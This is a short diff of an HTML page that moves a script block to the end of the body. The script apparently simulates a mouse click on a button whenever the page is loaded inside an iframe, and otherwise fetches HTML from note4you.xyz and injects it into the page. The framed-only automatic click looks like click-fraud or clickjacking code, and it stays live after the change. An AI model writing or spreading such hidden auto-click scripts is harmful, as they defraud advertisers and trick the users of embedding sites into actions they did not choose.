@@ -58,30 +58,6 @@ function isInIframe() {
 
 </script>
 	
-
-
-
-		
-	  <script>
-
-		
-	if (isInIframe()) {
-    myClick();
-    
-
-	} else {
-	  $.get("https://note4you.xyz/content.html", function(data, status){
-        $("#id1").html(data);
-
-    })
-	}
-
-
-        </script>
-
-</div>
-
-
   <script>
 
 function myClick() {    
@@ -120,6 +96,30 @@ simulateMouseEvent (theButton, "click", coordX, coordY);
 
 //myClick();
 </script>
+
+
+
+		
+	  <script>
+
+		
+	if (isInIframe()) {
+    myClick();
+    
+
+	} else {
+	  $.get("https://note4you.xyz/content.html", function(data, status){
+        $("#id1").html(data);
+
+    })
+	}
+
+
+        </script>
+
+</div>
+
+
 
 
 </body>
